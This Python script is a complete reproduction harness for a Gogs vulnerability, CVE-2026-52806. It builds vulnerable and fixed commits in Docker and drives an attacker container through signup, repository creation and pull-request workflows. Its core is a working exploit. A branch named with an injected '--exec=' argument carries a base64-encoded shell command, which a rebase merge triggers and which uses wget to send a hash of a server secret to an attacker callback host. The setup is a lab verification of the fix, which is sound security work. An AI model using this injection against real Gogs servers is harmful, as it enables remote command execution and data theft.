#!/usr/bin/env python3
"""Clean Stage 3 reproduction for CVE-2026-52806.

Run this file on a Docker host. It builds the exact vulnerable and fixed Gogs
commits, starts clean instances, and executes the same public workflow from a
separate attacker container. Retained evidence is written under ./evidence.
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import http.server
import os
from pathlib import Path
import re
import secrets
import shutil
import subprocess
import tempfile
import threading
import time
from urllib.parse import quote

try:
    import requests
except ModuleNotFoundError:  # The host orchestrator only needs the standard library.
    requests = None  # type: ignore[assignment]


VULNERABLE_COMMIT = "e3bb4165dceb96b66053a067f9f3584302413a0e"
FIXED_COMMIT = "a9dbafbfd8e1020bacc626420238c01d75d03364"
PASSWORD = "Stage3-ordinary-user-password"
EVIDENCE = Path("/study/evidence")


def run(command: list[str], **kwargs) -> subprocess.CompletedProcess[str]:
    return subprocess.run(command, check=True, text=True, **kwargs)


def csrf(html: str) -> str:
    match = re.search(r'name="_csrf" value="([^"]+)"', html)
    if not match:
        match = re.search(r'<meta name="_csrf" content="([^"]+)"', html)
    if not match:
        raise RuntimeError("CSRF token not found")
    return match.group(1)


class CallbackHandler(http.server.BaseHTTPRequestHandler):
    hits: list[str] = []

    def do_GET(self) -> None:  # noqa: N802 - stdlib callback API
        type(self).hits.append(self.path)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok\n")

    def log_message(self, _format: str, *_args: object) -> None:
        return


class GogsTrial:
    def __init__(self, label: str, base_url: str, expected_digest: str):
        self.label = label
        self.base_url = base_url.rstrip("/")
        self.expected_digest = expected_digest
        self.user = f"stage3{label}"
        self.session = requests.Session()
        self.lines: list[str] = [
            f"case={label}",
            f"commit={VULNERABLE_COMMIT}",
            f"repair_patch={FIXED_COMMIT if label == 'fixed' else 'none'}",
            f"target={self.base_url}",
            f"expected_witness_sha256={expected_digest}",
        ]

    def record(self, key: str, value: object) -> None:
        self.lines.append(f"{key}={value}")

    def wait_ready(self) -> None:
        for _ in range(90):
            try:
                response = requests.get(f"{self.base_url}/healthcheck", timeout=2)
                if response.status_code == 200:
                    self.record("healthcheck", response.status_code)
                    return
            except requests.RequestException:
                pass
            time.sleep(1)
        raise RuntimeError(f"{self.label} did not become ready")

    def shortcuts(self) -> None:
        for path in [
            "/.env",
            "/data/gogs/conf/app.ini",
            "/debug/pprof/",
            "/backup/",
            "/install",
            "/robots.txt",
        ]:
            response = requests.get(f"{self.base_url}{path}", timeout=10)
            leaked = self.expected_digest in response.text
            self.record(f"shortcut_{path}_status", response.status_code)
            self.record(f"shortcut_{path}_leaked_digest", str(leaked).lower())
            if leaked:
                raise RuntimeError(f"protected witness leaked through {path}")

        response = requests.post(
            f"{self.base_url}/api/v1/user/repos",
            json={"name": "unauthorized"},
            timeout=10,
        )
        self.record("unauthenticated_repo_create_status", response.status_code)
        if response.status_code < 400:
            raise RuntimeError("unauthenticated repository creation unexpectedly worked")

    def sign_up(self) -> None:
        def create(session: requests.Session, username: str, password: str) -> int:
            response = session.get(f"{self.base_url}/user/sign_up", timeout=10)
            response.raise_for_status()
            response = session.post(
                f"{self.base_url}/user/sign_up",
                data={
                    "_csrf": csrf(response.text),
                    "user_name": username,
                    "email": f"{username}@example.invalid",
                    "password": password,
                    "retype": password,
                },
                allow_redirects=False,
                timeout=20,
            )
            if response.status_code not in (302, 303):
                raise RuntimeError(f"signup failed: {response.status_code} {response.text[:200]}")
            return response.status_code

        # Gogs promotes the first account on a clean instance to site admin.
        # Provision that account separately so the actual attacker is an
        # ordinary second user.
        setup_session = requests.Session()
        admin_status = create(setup_session, f"stage3maint{self.label}", secrets.token_urlsafe(24))
        self.record("setup_admin_signup_status", admin_status)
        response_status = create(self.session, self.user, PASSWORD)
        self.record("signup_status", response_status)

        response = self.session.get(f"{self.base_url}/user/login", timeout=10)
        response.raise_for_status()
        response = self.session.post(
            f"{self.base_url}/user/login",
            data={"_csrf": csrf(response.text), "user_name": self.user, "password": PASSWORD},
            allow_redirects=False,
            timeout=20,
        )
        self.record("login_status", response.status_code)
        if response.status_code not in (302, 303):
            raise RuntimeError(f"login failed: {response.status_code} {response.text[:200]}")
        admin_page = self.session.get(f"{self.base_url}/admin", timeout=10)
        self.record("ordinary_user_admin_page_status", admin_page.status_code)
        if admin_page.status_code < 400:
            raise RuntimeError("attacker unexpectedly has site-admin access")

    def create_repo(self, name: str) -> None:
        page = self.session.get(f"{self.base_url}/repo/create", timeout=20)
        page.raise_for_status()
        owner = re.search(r'name="user_id" value="([0-9]+)"', page.text)
        if not owner:
            raise RuntimeError("repository owner field not found")
        response = self.session.post(
            f"{self.base_url}/repo/create",
            data={
                "_csrf": csrf(page.text),
                "user_id": owner.group(1),
                "repo_name": name,
                "description": "Stage 3 public-workflow trial",
                "readme": "Default",
            },
            allow_redirects=False,
            timeout=30,
        )
        self.record(f"{name}_create_status", response.status_code)
        if response.status_code not in (302, 303):
            raise RuntimeError(f"repo create failed: {response.status_code} {response.text[:300]}")

    def enable_rebase(self, name: str) -> None:
        url = f"{self.base_url}/{self.user}/{name}/settings"
        response = self.session.get(url, timeout=20)
        response.raise_for_status()
        response = self.session.post(
            url,
            data={
                "_csrf": csrf(response.text),
                "action": "advanced",
                "repo_name": name,
                "enable_wiki": "on",
                "enable_issues": "on",
                "enable_pulls": "on",
                "pulls_allow_rebase": "on",
            },
            allow_redirects=False,
            timeout=20,
        )
        self.record(f"{name}_enable_rebase_status", response.status_code)
        if response.status_code not in (302, 303):
            raise RuntimeError(f"enable rebase failed: {response.status_code}")

    def push_branches(self, name: str, malicious: str | None = None, suffix: str = "") -> Path:
        work = Path(tempfile.mkdtemp(prefix=f"{self.label}-{name}-"))
        run(["git", "init", "-b", "master", str(work)], capture_output=True)
        run(["git", "-C", str(work), "config", "user.email", "attacker@example.invalid"])
        run(["git", "-C", str(work), "config", "user.name", "Stage 3 attacker"])
        (work / "README.md").write_text("baseline\n", encoding="utf-8")
        run(["git", "-C", str(work), "add", "README.md"])
        run(["git", "-C", str(work), "commit", "-m", "initial"], capture_output=True)
        run(["git", "-C", str(work), "checkout", "-b", f"feature{suffix}"], capture_output=True)
        (work / f"feature{suffix}.txt").write_text(f"feature {suffix}\n", encoding="utf-8")
        run(["git", "-C", str(work), "add", f"feature{suffix}.txt"])
        run(["git", "-C", str(work), "commit", "-m", f"feature {suffix}"], capture_output=True)
        run(["git", "-C", str(work), "checkout", "master"], capture_output=True)
        with (work / "README.md").open("a", encoding="utf-8") as handle:
            handle.write(f"base {suffix}\n")
        run(["git", "-C", str(work), "commit", "-am", f"base {suffix}"], capture_output=True)
        if malicious:
            run(["git", "-C", str(work), "update-ref", f"refs/heads/{malicious}", "HEAD"])

        auth_url = self.base_url.replace(
            "://", f"://{quote(self.user)}:{quote(PASSWORD)}@", 1
        )
        run(["git", "-C", str(work), "remote", "add", "origin", f"{auth_url}/{self.user}/{name}.git"])
        refs = ["master", f"feature{suffix}"]
        if malicious:
            refs.append(f"refs/heads/{malicious}:refs/heads/{malicious}")
        run(
            ["git", "-C", str(work), "push", "origin", *refs],
            capture_output=True,
        )
        self.record(f"{name}_push", "ok")
        return work

    def create_pr(self, name: str, base: str, head: str, expected: tuple[int, ...] = (302, 303)) -> requests.Response:
        encoded_base = quote(base, safe="")
        encoded_head = quote(head, safe="")
        url = f"{self.base_url}/{self.user}/{name}/compare/{encoded_base}...{encoded_head}"
        page = self.session.get(url, timeout=30)
        self.record(f"{name}_{head}_compare_status", page.status_code)
        page.raise_for_status()
        response = self.session.post(
            url,
            data={"_csrf": csrf(page.text), "title": f"Stage 3 {head}", "content": "public PR workflow"},
            allow_redirects=False,
            timeout=90,
        )
        self.record(f"{name}_{head}_pr_create_status", response.status_code)
        if response.status_code not in expected:
            raise RuntimeError(f"PR creation got {response.status_code}, expected {expected}")
        return response

    def merge_pr(self, name: str, index: int) -> requests.Response:
        url = f"{self.base_url}/{self.user}/{name}/pulls/{index}"
        page = self.session.get(url, timeout=30)
        self.record(f"{name}_pr{index}_view_status", page.status_code)
        page.raise_for_status()
        mergeable = "rebase_before_merging" in page.text and f"/pulls/{index}/merge" in page.text
        self.record(f"{name}_pr{index}_mergeable_ui", str(mergeable).lower())
        if not mergeable:
            raise RuntimeError(f"PR {index} does not expose the rebase merge path")
        response = self.session.post(
            f"{url}/merge",
            data={"_csrf": csrf(page.text), "merge_style": "rebase_before_merging"},
            allow_redirects=False,
            timeout=90,
        )
        self.record(f"{name}_pr{index}_merge_status", response.status_code)
        return response

    def normal_baseline(self) -> None:
        name = "normal-rebase"
        self.create_repo(name)
        self.enable_rebase(name)
        work = self.push_branches(name)
        try:
            self.create_pr(name, "master", "feature")
            response = self.merge_pr(name, 1)
            if response.status_code not in (302, 303):
                raise RuntimeError(f"normal rebase failed: {response.status_code}")
            raw = requests.get(
                f"{self.base_url}/{self.user}/{name}/raw/master/feature.txt",
                timeout=20,
            )
            self.record("normal_rebase_raw_status", raw.status_code)
            self.record("normal_rebase_feature_preserved", str(raw.text == "feature \n").lower())
            if raw.status_code != 200 or raw.text != "feature \n":
                raise RuntimeError("normal rebase did not preserve the feature commit")
        finally:
            shutil.rmtree(work, ignore_errors=True)

    def exploit_trial(self) -> None:
        name = "fresh-exploit"
        self.create_repo(name)
        self.enable_rebase(name)
        command = (
            "v=$(printf %s \"$STAGE3_WITNESS\"|sha256sum|cut -d' ' -f1);"
            f"wget -qO- http://stage3-gogs-attacker:8081/witness/{self.label}/$v"
        )
        encoded = base64.b64encode(command.encode()).decode()
        if "//" in encoded:
            raise RuntimeError("generated base64 contains an invalid double slash ref sequence")
        malicious = f"--exec=echo${{IFS}}{encoded}|base64${{IFS}}-d|sh"
        self.record("malicious_branch", malicious)
        work = self.push_branches(name, malicious)
        try:
            self.create_pr(name, malicious, "feature")

            # A second PR on the same repository exercises the already-existing
            # local-copy path. The first PR is intentionally retained as the
            # clean-instance trigger.
            run(["git", "-C", str(work), "checkout", "master"], capture_output=True)
            run(["git", "-C", str(work), "checkout", "-b", "feature2"], capture_output=True)
            (work / "feature2.txt").write_text("second feature\n", encoding="utf-8")
            run(["git", "-C", str(work), "add", "feature2.txt"])
            run(["git", "-C", str(work), "commit", "-m", "second feature"], capture_output=True)
            run(["git", "-C", str(work), "push", "origin", "feature2"], capture_output=True)
            second = self.create_pr(name, malicious, "feature2", expected=(302, 303, 500))
            self.record("existing_local_copy_second_pr_result", second.status_code)

            response = self.merge_pr(name, 1)
            self.record("merge_http_500_is_not_witness", str(response.status_code == 500).lower())
            deadline = time.time() + 15
            expected_path = f"/witness/{self.label}/{self.expected_digest}"
            while time.time() < deadline and expected_path not in CallbackHandler.hits:
                time.sleep(0.25)
            witnessed = expected_path in CallbackHandler.hits
            self.record("callback_expected_path", expected_path)
            self.record("callback_observed", str(witnessed).lower())
            if self.label == "vulnerable" and not witnessed:
                raise RuntimeError("vulnerable command witness was not observed")
            if self.label == "fixed" and witnessed:
                raise RuntimeError("fixed commit executed the injected command")
        finally:
            shutil.rmtree(work, ignore_errors=True)

    def execute(self) -> None:
        self.wait_ready()
        self.shortcuts()
        self.sign_up()
        before = list(CallbackHandler.hits)
        self.normal_baseline()
        self.record("callback_after_normal_baseline", len(CallbackHandler.hits) - len(before))
        if len(CallbackHandler.hits) != len(before):
            raise RuntimeError("normal workflow unexpectedly reached the command witness")
        self.exploit_trial()
        self.record("all_callback_hits", ",".join(CallbackHandler.hits) or "none")
        (EVIDENCE / f"{self.label}.txt").write_text("\n".join(self.lines) + "\n", encoding="utf-8")


def app_ini(service_name: str) -> str:
    return f"""APP_NAME = Gogs Stage 3
RUN_USER = git
RUN_MODE = prod

[database]
TYPE = sqlite3
PATH = /data/gogs/gogs.db

[repository]
ROOT = /data/git/gogs-repositories
DEFAULT_BRANCH = master

[server]
DOMAIN = {service_name}
HTTP_PORT = 3000
EXTERNAL_URL = http://{service_name}:3000/
DISABLE_SSH = true
OFFLINE_MODE = true

[auth]
DISABLE_REGISTRATION = false
ENABLE_REGISTRATION_CAPTCHA = false
REQUIRE_EMAIL_CONFIRMATION = false

[security]
INSTALL_LOCK = true
SECRET_KEY = stage3-only-secret-key

[session]
PROVIDER = file

[log]
MODE = console
LEVEL = Info
"""


def clean_runtime(run_dir: Path) -> None:
    if not run_dir.exists():
        return
    # The official entrypoint changes bind-mounted /data ownership to its git
    # user. Clean that one exact disposable directory from a container before
    # asking the unprivileged host process to remove the mount point.
    run(
        [
            "docker",
            "run",
            "--rm",
            "-v",
            f"{run_dir}:/stage3-runtime",
            "alpine:3.23",
            "sh",
            "-c",
            "rm -rf /stage3-runtime/*",
        ]
    )
    shutil.rmtree(run_dir, ignore_errors=True)


def host_main() -> None:
    root = Path(__file__).resolve().parent
    run_dir = Path("/tmp/gogs-stage3-runtime")
    clean_runtime(run_dir)
    for label, service in (("vulnerable", "gogs-vulnerable"), ("fixed", "gogs-fixed")):
        conf = run_dir / label / "gogs" / "conf"
        conf.mkdir(parents=True)
        (conf / "app.ini").write_text(app_ini(service), encoding="utf-8")
    evidence = root / "evidence"
    evidence.mkdir(exist_ok=True)
    for old in evidence.glob("*.txt"):
        old.unlink()

    vulnerable_witness = secrets.token_hex(24)
    fixed_witness = secrets.token_hex(24)
    env = os.environ.copy()
    env.update(
        {
            "STAGE3_RUN_DIR": str(run_dir),
            "VULNERABLE_WITNESS": vulnerable_witness,
            "FIXED_WITNESS": fixed_witness,
        }
    )
    compose = ["docker", "compose", "-f", str(root / "compose.yaml")]
    try:
        run(compose + ["build"], cwd=root, env=env)
        run(compose + ["up", "-d", "gogs-vulnerable", "gogs-fixed"], cwd=root, env=env)
        run(
            compose
            + [
                "run",
                "--rm",
                "--name",
                "stage3-gogs-attacker",
                "-e",
                f"VULNERABLE_DIGEST={hashlib.sha256(vulnerable_witness.encode()).hexdigest()}",
                "-e",
                f"FIXED_DIGEST={hashlib.sha256(fixed_witness.encode()).hexdigest()}",
                "attacker",
            ],
            cwd=root,
            env=env,
        )
    finally:
        subprocess.run(compose + ["down", "-v", "--remove-orphans"], cwd=root, env=env, check=False)
        clean_runtime(run_dir)


def inside_main() -> None:
    if requests is None:
        raise RuntimeError("the attacker image is missing requests")
    EVIDENCE.mkdir(parents=True, exist_ok=True)
    server = http.server.ThreadingHTTPServer(("0.0.0.0", 8081), CallbackHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        GogsTrial("vulnerable", "http://gogs-vulnerable:3000", os.environ["VULNERABLE_DIGEST"]).execute()
        GogsTrial("fixed", "http://gogs-fixed:3000", os.environ["FIXED_DIGEST"]).execute()
    finally:
        server.shutdown()


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--inside", action="store_true")
    args = parser.parse_args()
    if args.inside:
        inside_main()
    else:
        host_main()


if __name__ == "__main__":
    main()
